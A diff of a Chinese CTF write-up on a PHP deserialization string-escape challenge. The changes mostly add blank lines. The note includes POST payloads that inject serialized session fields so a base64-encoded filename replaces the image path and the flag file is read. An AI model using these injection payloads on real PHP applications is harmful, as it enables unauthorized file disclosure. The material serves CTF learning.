@@ -2,6 +2,7 @@
 
 ---
 首页长这样
+
 ![[Pasted image 20221119110705.png]]
 
 ---
@@ -56,18 +57,22 @@ if($function == 'highlight_file'){
 ```
 
 ![[Pasted image 20221119113417.png]]
+
 果不其然发现了存放`flag`的文件名`
 
 ---
 考虑到`filter`函数作用于序列化后的字符串
+
 总体思路就是利用反序列化字符串逃逸使得`$userinfo['img']`结果为`base64_encode('d0g3_f1ag.php')`
 
 部署到本地再加了两句
+
 ![[Pasted image 20221119212823.png]]
 ```php
 _SESSION[phpfl1g]=;s:3:"123";s:3:"img";s:3:"abc";}
 ```
 不得不吐槽php这语言各方面都好宽松QwQ
+
 ![[Pasted image 20221119212806.png]]
 
 ---
@@ -82,9 +87,11 @@ POST
 _SESSION[phpfl1g]=;s:3:"123";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
 ```
 ![[Pasted image 20221119213410.png]]
+
 再来一步
 ```php
 _SESSION[phpfl1g]=;s:3:"123";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
 ```
 ![[Pasted image 20221119213746.png]]
+
 #Web #PHP #反序列化 #字符串逃逸
